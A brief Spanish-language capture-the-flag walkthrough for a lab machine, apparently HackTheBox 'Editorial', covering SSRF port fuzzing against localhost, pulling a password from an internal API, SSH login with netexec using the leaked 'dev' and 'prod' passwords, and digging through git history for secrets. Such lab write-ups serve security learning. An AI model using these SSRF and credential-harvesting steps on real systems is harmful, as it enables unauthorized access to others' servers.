---
title: "Enterprise"
---


# SSRF

Probamos :
```
127.0.0.1:80
```

```
http://127.0.0.1:(1-65535)
```

Fuzzeamos del 1-65535 los puertos hasta encontrar uno que retorne un resultado distinto.

Se trata de un API y en uno de sus endpoints retorna una contraseña:

Hacer una petición a 

```
http://127.0.0.1:5000/api/latest/metadata/messages/authors
```

Devuelve el siguiente recurso

```bash
curl -s 'http://editorial.htb/static/uploads/63ef32c6-91b8-4ac1-9216-000fd0a3f1a1' | jq .
```

Que tiene una contraseña:

```bash
netexec ssh editorial.htb -u dev -p 'dev080217_devAPI!@'
```

___

```bash
cd /app
```

```bash
git status
```

```bash
git log --oneline 
```

```bash
git diff hashcommit1 hashcommit2
```

```bash
netexec ssh editorial.htb -u prod -p '080217_Producti0n_2023!@'
```
